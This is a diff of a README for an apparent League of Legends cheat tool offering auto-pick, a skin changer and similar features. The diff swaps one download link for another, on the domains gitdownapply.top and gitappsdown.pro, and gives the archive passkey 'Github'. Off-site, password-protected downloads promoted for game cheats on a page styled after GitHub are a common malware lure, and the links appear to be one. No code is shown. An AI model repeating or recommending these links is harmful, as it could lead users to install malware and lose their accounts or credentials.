@@ -9,7 +9,7 @@ League of Legends tools with auto-accept, auto-pick, auto-ban, skin changer, zoo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -86,7 +86,7 @@ Key technologies used:
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Launch League of Legends client and log in.
 
